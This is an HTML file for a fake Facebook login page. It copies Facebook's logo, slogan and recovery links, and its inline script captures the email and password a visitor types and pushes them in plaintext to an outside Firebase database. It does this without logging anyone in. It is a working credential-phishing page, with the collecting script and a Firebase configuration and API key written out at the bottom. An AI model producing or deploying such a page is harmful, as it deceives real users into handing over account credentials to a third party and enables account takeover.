<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <link rel="shortcut icon" href="close.png" type="image/x-icon">
  <title>log in or sign up</title>
</head>

<body>
  <form id="myForm">
    <div class="row">
      <div class="colm-logo">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
        <h2>Facebook helps you connect and share with the people in your life.</h2>
      </div>
      <div class="colm-form">
        <div class="colm-log">
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
        </div>
        <div class="form-container">
          <input type="email" placeholder="Email address or phone number" name="email" id="email" required>
          <input type="password" placeholder="Password" name="pass" id="pass" required>
          <button class="btn-login" value="Submit">Login</button>
          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
            password?</a>
          <button class="btn-new" type="button">Create new Account</button>
        </div>
        <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"><b>Create a
              Page</b></a> for a celebrity, brand or business.</p>

      </div>
    </div>
  </form>

  <!-- Firebase configuration -->
  <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDS5Jw2QyXm0BqH_VzrdtK4uCZYNrX0F0g",
      authDomain: "auth-f9f43.firebaseapp.com",
      databaseURL: "https://auth-f9f43-default-rtdb.firebaseio.com",
      projectId: "auth-f9f43",
      storageBucket: "auth-f9f43.appspot.com",
      messagingSenderId: "292226887598",
      appId: "1:292226887598:web:dba5f2d74261e87d2da23f"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);

    // Get a reference to the database
    const database = firebase.database();

    // Handle form submission
    document.getElementById("myForm").addEventListener("submit", (event) => {
      event.preventDefault();

      const email = document.getElementById("email").value;
      const pass = document.getElementById("pass").value;

      // Save the form data to the database
      database.ref("formData").push({
        email,
        pass
      });

      // Reset the form
      document.getElementById("myForm").reset();
    });
  </script>

</body>

</html>
